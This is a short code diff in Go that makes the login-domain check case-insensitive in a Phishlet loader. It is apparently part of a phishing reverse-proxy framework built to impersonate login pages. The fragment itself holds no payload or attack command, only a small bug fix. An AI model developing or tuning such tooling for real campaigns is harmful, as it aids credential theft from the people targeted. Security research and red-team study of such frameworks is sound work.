@@ -427,7 +427,7 @@ func (p *Phishlet) LoadFromFile(site string, path string) error {
 			check_host = h.orig_subdomain + "."
 		}
 		check_host += h.domain
-		if check_host == p.login.domain {
+		if strings.ToLower(check_host) == strings.ToLower(p.login.domain) {
 			login_domain_ok = true
 			break
 		}
